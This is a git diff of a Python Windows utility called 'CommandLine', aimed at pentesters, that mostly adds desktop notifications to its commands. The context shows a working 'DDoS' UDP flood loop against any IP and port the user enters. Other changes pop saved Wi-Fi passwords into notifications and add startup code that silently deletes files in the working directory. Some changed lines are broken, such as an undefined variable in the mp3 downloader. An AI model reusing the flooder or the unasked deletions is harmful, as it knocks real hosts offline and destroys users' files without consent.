@@ -1,4 +1,5 @@
 from pprint import pp
+from typing import no_type_check
 from colorama import *
 from time import sleep
 import os
@@ -9,7 +10,18 @@ import wget
 import os
 from getpass import getuser
 from zipfile import ZipFile
+from plyer import notification
 
+def notification_c(fmessage):
+ try:
+    notification.notify(
+        title = 'CommandLine',
+        message = fmessage,
+        app_icon = 'icons\\commandline.ico',
+        timeout = 10,
+    )
+ except:
+     pass
 
 def usercommand(self):
     try:
@@ -29,7 +41,7 @@ This Software is licensed to {getpass.getuser()}.
 |-> From Aisoft-co.                                    |
 |-> CLI Based Software.                                |  
 |-> Open-Source.                                       |
-|-> Version 2.0.7                                      |
+|-> Version 2.0.8                                      |
 |-> Language : Python3.                                | 
 |-> For Pentesters and for Ethical Hackers.            | 
 |-> Type : Terminal.                                   |
@@ -261,10 +273,10 @@ This Software is licensed to {getpass.getuser()}.
         elif z == "net.speedtest":
             import speedtest
 
+            notification_c("Testing Your Network Speed")
             def getNetSpeed():
                 import speedtest
                 tester = speedtest.Speedtest()
-
                 print("Searching For The Best Server...")
                 # Check for the best servers
                 bestServer = tester.get_best_server()
@@ -284,8 +296,11 @@ This Software is licensed to {getpass.getuser()}.
                     f'-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s')
                 print(f'-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s')
                 print(f'-Ping : {ping :.2f} ms')
-
-            for i in range(3):
+                notification_c(f"""Here are SpeedTest Results
+-Download speed : {downloadSpeed/1048576 :.2f} Mbits/s
+-Upload speed : {uploadSpeed/1048576 :.2f} Mbits/s
+-Ping : {ping :.2f} ms""")
+            for i in range(1):
                 print(getNetSpeed())
         # Winver
         elif z == "win.ver":
@@ -341,6 +356,7 @@ This Software is licensed to {getpass.getuser()}.
                     time.sleep(1)
                     print("[====================] 100%")
                     time.sleep(1)
+                    notification_c(f"Started DDoS Attack at {ip} on port {port}")
                     sent = 0
                     while True:
                         sock.sendto(bytes, (ip, port))
@@ -352,7 +368,7 @@ This Software is licensed to {getpass.getuser()}.
                             port = 1
 
                 except KeyboardInterrupt as exception:
-                    KeyboardInterrupt == print("ok")
+                    KeyboardInterrupt == print("\nok") , notification_c(f"The DDoS Attact on {ip} and port {port} has been stopped due to keyboard interupt")
                 except socket.gaierror as axs:
                     socket.gaierror == print(f"{ip} <-- Wrong Ip address")
 
@@ -363,6 +379,7 @@ This Software is licensed to {getpass.getuser()}.
                     port2 = int(input("Port       : "))
                     print(
                         f"Starting an DDoS Attack on Host {user13232} ip address is {ip2}:")
+                    notification_c(f"Started DDoS Attack at {user13232} ip address is {ip2}")
                     sent = 0
                     while True:
                         sock.sendto(bytes, (ip2, port2))
@@ -373,15 +390,14 @@ This Software is licensed to {getpass.getuser()}.
                         if port2 == 65534:
                             port2 = 1
                 except KeyboardInterrupt as exception:
-                    KeyboardInterrupt == print(
-                        "Process Stopped - REASON : KeyBoard Interrupt\n")
+                    KeyboardInterrupt == print("\nProcess Stopped - REASON : KeyBoard Interrupt") , notification_c(f"The DDoS Attact on {user13232} with the ip address of {ip2} has been stopped due to keyboard interupt")
                 except socket.gaierror:
                     socket.gaierror == print(
                         f"{user13232} <-- Host Not Found + No ip address Found ")
 
         # app updater
         elif z == "update.commandline":
-            # commandlineupdate()
+            commandlineupdate()
             pass
         # gitclonner
         elif z == "git.clone":
@@ -393,6 +409,7 @@ This Software is licensed to {getpass.getuser()}.
                 "Enter the folder name(new folder to store files): ")
             combine_a = ask_abt_dir+"\\"+ask_folder_name
             Repo.clone_from(ask_abt_url, combine_a)
+            notification_c(f"The Repo {ask_abt_url} is cloned the files are located on {combine_a}")
         # Scan fix kit 
         elif z == "scanfix":
             import os
@@ -412,16 +429,18 @@ This Software is licensed to {getpass.getuser()}.
             if option == "a":
                 # if the user selects option a, the program will scan and fix the broken files.
                 try:
+                    notification_c("The Auto Scan Fix is Started.")
                     sleep(2)
                     print(f"{Fore.RED} This process could take some time.")
                     # sfc/scannow is the command that scans and fix the files automatically.
                     os.system("sfc/scannow")
+                    notification_c("The System Scan and Fix is Completed")
                 # if the user presses ctrl+c, the program will ask for stopping the process.
                 except KeyboardInterrupt:
                     ask_stop_scan = input(
                         " Do you want to stop the scan?[y/n]: ")
                     if ask_stop_scan == "y":
-                        pass
+                          notification_c("The ScanFix Process has been stoped.")
                     else:
                         pass
 
@@ -451,6 +470,7 @@ This Software is licensed to {getpass.getuser()}.
                 except:
                     print(f"{Fore.RED}Unknown Error was Found!")
                 print(f"{Fore.RED}Cleaning Completed!")
+                notification_c("The Temp folders are cleaned now!")
                 usr_ask_log = input(
                     "Do you want to save a log of the cleaning?[y/n]: ")
                 if usr_ask_log == "y":
@@ -483,6 +503,7 @@ This Software is licensed to {getpass.getuser()}.
                                 f.write('\n')
                                 f.write("==========================\n")
                                 f.close()
+                                notification_c("The Logs has been saved at the current Directory")
                             f = open("logs.txt", "a")
                             f.writelines('Files in c:\windows\\temp\n')
                             with open("logs.txt", "a") as f:
@@ -500,16 +521,18 @@ This Software is licensed to {getpass.getuser()}.
             elif option == "c":
                 # if the user selects option c, the program will scans the broken files.
                 try:
+                    notification_c("The Auto Scan is Started.")
                     sleep(2)
                     print(f"{Fore.RED} This process could take some time.")
                     # sfc/verifyonly is the command that scans files.
                     os.system("sfc/verifyonly")
                 # if the user presses ctrl+c, the program will ask for stopping the process.
+                    notification_c("The System Scan is Completed")                    
                 except KeyboardInterrupt:
                     ask_stop_scan2 = input(
                         " Do you want to stop the scan?[y/n]: ")
                     if ask_stop_scan2 == "y":
-                        pass
+                       notification_c("The System Scan is Stoped")               
                     else:
                         pass
        # This will show the current running tasks
@@ -571,15 +594,29 @@ This Software is licensed to {getpass.getuser()}.
                 print(Fore.RED+"Wrong Command! Try Again.")
         # download youtube videos
         elif z == "pkg.youtube": # This basically uses a module called youtube_dl 
-                                 # to download youtube videos same goes with the mp3.
+                                 # to download youtube videos 
             try:
+                def youtube_title_finder():
+                    import requests
+                    from bs4 import BeautifulSoup
+                    resp = requests.get(zxt)
+                    s = BeautifulSoup(resp.text , 'html.parser')
+                    global title
+                    title = s.find("title").text
+                    title = title.replace("- YouTube" , "")
+                    return title
               # importing module
                 import youtube_dl
                 ydl_opts = {}
 
                 def dwl_vid():
+                    youtube_title_finder()
                     with youtube_dl.YoutubeDL(ydl_opts) as ydl:
+                        mess1 = "The youtube video is being downloaded\n"+ title 
+                        notification_c(mess1)
                         ydl.download([zxt])
+                        mess4 = "The youtube video is successfully downloaded\n"+ title 
+                        notification_c(mess4)
 
                 channel = 1
                 while (channel == int(1)):
@@ -591,41 +628,51 @@ This Software is licensed to {getpass.getuser()}.
                         input("Enter 1 if you want to download more videos \nEnter 0 if you are done : "))
 
             except KeyboardInterrupt as exception:
-                KeyboardInterrupt == print("ok")
+                KeyboardInterrupt == notification_c("The YouTube Download is Stopped\n" + title)
 
                 # Mp3 youtube downloader
         elif z == "pkg.youtube.mp3":
-            try:
-                import youtube_dl
+          # importing packages
+            from pytube import YouTube
+            import os
+            
+            # url input from user
+            yt = YouTube(
+                str(input("Enter Video URL : ")))
 
-                def run():
-                    video_url = input("Enter Video URL: ")
-                    video_info = youtube_dl.YoutubeDL().extract_info(
-                        url=video_url, download=False
-                    )
-                    filename = f"{video_info['title']}.mp3"
-                    options = {
-                        'format': 'bestaudio/best',
-                        'keepvideo': False,
-                        'outtmpl': filename,
-                    }
+            # extract only audio
+            video = yt.streams.filter(only_audio=True).first()
 
-                    with youtube_dl.YoutubeDL(options) as ydl:
-                        ydl.download([video_info['webpage_url']])
+            # check for destination to save file
+            print("Enter the destination (leave blank for current directory)")
+            destination = str(input(">> ")) or '.'
 
-                    print("Download complete... {}".format(filename))
+            # download the file
+            mess3 = "The youtube MP3 is being downloaded\n"+ title 
+            notification_c(mess3)
+            out_file = video.download(output_path=destination)
+            
+            mess2 = "The youtube MP3 is successfully downloaded\n"+ title 
+            notification_c(mess2)
+            # save the file
+            base, ext = os.path.splitext(out_file)
+            new_file = base + '.mp3'
+            os.rename(out_file, new_file)
 
-                if __name__ == '__main__':
-                    run()
-            except:
-                print("Unknown Error Was Found!")
-
+            # result of success
+            print(yt.title + " has been successfully downloaded.")
         # get files from internet
         elif z == "pkg.download":
             try:
                 import wget
                 url1 = input("Enter file url: ")
-                wget.download(url1)
+                while True:
+                    try:
+                        os.mkdir("My Files")
+                        break
+                    except FileExistsError:
+                        break
+                wget.download(url1 , out="My Files")
                 print("Download is completed successfully")
             except:
                 print(f"{url1} <-- Wrong Package!")
@@ -647,6 +694,7 @@ This Software is licensed to {getpass.getuser()}.
                 oc = input("Do you want to Shutdown this device y or n : ")
                 if oc == "y":
                     os.system("shutdown /s") # uses cmd to shutdown computer by os.system("Shutdown /s").
+                    notification_c("Your PC will shutdown soon.")
                 elif z == "n":
                     print("Ok")
                 else:
@@ -662,6 +710,7 @@ This Software is licensed to {getpass.getuser()}.
                 if g == "y":
                     os.system("shutdown /r") # uses cmd to restart computer by os.system("Shutdown /r").
                     # /r stands for restart.
+                    notification_c("Your PC will Restart soon.")
                 elif g == "n":
                     print("Ok")
                 else:
@@ -676,6 +725,7 @@ This Software is licensed to {getpass.getuser()}.
                 fl = input("Do you want to logout y or n : ")
                 if fl == "y":
                     subprocess.check_output("shutdown /l").decode('utf-8') 
+                    notification_c("Your PC will Logout soon.")
                 elif z == "n":
                     print("Ok")
                 else:
@@ -708,6 +758,7 @@ This Software is licensed to {getpass.getuser()}.
             import subprocess
             proc3 = subprocess.check_output("ipconfig /renew").decode('utf-8')
             print(proc3)
+            notification_c("All Adapters are renewed successfully.")
 
         # Release all adapters
         elif z == "wlan.release":
@@ -715,6 +766,7 @@ This Software is licensed to {getpass.getuser()}.
             proc34 = subprocess.check_output(
                 "ipconfig /release").decode('utf-8')
             print(proc34)
+            notification_c("All Adapters are released successfully.")
 
         # Check if Url exists
         elif z == "check.urlexists":
@@ -722,20 +774,19 @@ This Software is licensed to {getpass.getuser()}.
             try:
                 askusrabturlex = input("Enter Url:")
                 response = requests.get("http://"+askusrabturlex)
-                if askusrabturlex.find == "http://" or "https://" == True:
-                    print("Dont use https or http!")
-                else:
-                    print(f" {askusrabturlex} => Url Exists")
-                    auaiwtv = input(
-                        f"Do you want to Visit {askusrabturlex} y or n : ")
-                    if auaiwtv == "y":
-                        print(f"Opening {askusrabturlex} in Browser")
-                        import webbrowser
-                        webbrowser.open_new_tab(askusrabturlex)
-                    else:
-                        print("Ok")
+             
             except requests.ConnectionError as exception:
                 print(f"{askusrabturlex} Not Exists!")
+        elif z == "update.info":
+            from bs4 import BeautifulSoup
+            import requests
+
+            review_url = "https://pastebin.com/DrX3LbR9"
+            resp = requests.get(review_url)
+            soup = BeautifulSoup(resp.text , 'html.parser')
+            find_info  = soup.find("textarea").text
+            print(find_info)
+
 
         # Show wifi passwords
         elif z == "wlan/show.pass":
@@ -768,6 +819,7 @@ This Software is licensed to {getpass.getuser()}.
                 wifi_list.append(wifi_profile)
                 for x in range(len(wifi_list)):
                     print(wifi_list[x])
+                    notification_c(f"The Passwords are found! {wifi_list[x]}")
                     savepass = input(
                         "Do you want to save these passwords y or n :")
                     if savepass == "y":
@@ -867,7 +919,7 @@ This Software is licensed to {getpass.getuser()}.
             devices = devices.decode('ascii')
             devices = devices.replace("\r", "")
             print(devices)
-
+            notification_c(f"The wifi devices are found!")
         # if users input is null or nothing.
         elif z == "":
             pass
@@ -896,6 +948,7 @@ This Software is licensed to {getpass.getuser()}.
 |[*] "showall/?" to show all commands.                 |
 |[*] "show.scritps" to show all scripts.               |
 |[*] "shutdown/?" to show shutdown commands.           |
+|[*] "update.info" to the info of the latest update.   |
 |------------------------------------------------------|""")
 
         # If user will input a  wrong command:
@@ -914,7 +967,7 @@ def commandlineupdate():
     import requests
     from bs4 import BeautifulSoup
 
-    Program_Ver = "2w.0e.7s"
+    Program_Ver = "2w.0e.8s"
 
     def updateCheck():
         versionReturn()
@@ -933,7 +986,11 @@ def commandlineupdate():
         sleep(0.5)
         print(f"Program version is    : {ver_rem_strip}")
         sleep(1)
-        if Program_Ver == version_check:
+        review_url = "https://pastebin.com/WePYbH80"
+        resp = requests.get(review_url)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        old_ver_check = soup.find("textarea").text
+        if Program_Ver in old_ver_check:
             print("The Version is Latest + No New Updates are Avalaible")
         else:
             print("The version is not latest")
@@ -972,6 +1029,7 @@ def commandlineupdate():
         old_ver_check = soup.find("textarea").text
         if Program_Ver in old_ver_check:
             print(f"New Update is Found -> {web_rem_strip2}")
+            notification_c(f"The new update is Found -> {web_rem_strip2} ")
             ask_to_update = input("Do you want to update? (Y/N): ")
             if ask_to_update == "Y" or ask_to_update == "y":
                 wget.download(
@@ -1032,6 +1090,37 @@ if __name__ == "__main__":
         except:
             pass
         try:
+            while True:
+             try:
+                os.mkdir("My Files")
+                break
+             except FileExistsError:
+               break
+            import os
+            dir1 = [f for f in os.listdir('.')]
+            for f in dir1:
+                if f.endswith('.txt'):
+                    try:
+                        shutil.move(f , 'My Files')
+                    except:
+                        os.remove(f)
+                elif f.endswith('.mp3'):
+                    try:
+                        shutil.move(f , 'My Files')
+                    except:
+                        os.remove(f)
+                elif f.endswith('.mp4'):
+                    try:
+                        shutil.move(f , 'My Files')
+                    except:
+                        os.remove(f)
+                elif f.endswith('.part'):
+                 os.remove(f)
+                elif f.endswith('.tmp'):
+                 os.remove(f)
+        except:
+            pass
+        try:
             import ctypes
             import os
 
@@ -1043,7 +1132,7 @@ if __name__ == "__main__":
                 return is_admin
             if isAdmin() == False:
                 ask_exeit_add = input(
-                    "The Program is not in Administrator mode. Do You still want to Continue  [y/n] :")
+                    "The Program is not in Administrator mode. Do You still want to Continue  [y/n] : ")
                 if ask_exeit_add == "y" or ask_exeit_add == "Y":
                     pass
                 else:
@@ -1066,10 +1155,10 @@ if __name__ == "__main__":
                         if filehash not in unique:
                             unique[filehash] = filename
                         else:
-                            pass
-                        os.remove(filename)
+                            os.remove(filename)
         except:
             pass
+    
         sleep(2)
         print("Checking for updates...")
         print("\n")
@@ -1079,6 +1168,7 @@ if __name__ == "__main__":
         print("Clearing the Console...")
         def clear(): return os.system('cls' if os.name == 'nt' else 'clear')
         clear()  # Clears Console
+        notification_c("The CommandLine is Initialized")
         print("CommandLine\n")
         print("Copyright (c) 2022. All Rights Reserved.\n")
         print("Make sure to Run as Administrator. Active Internet connection is required to run things properly.\n")
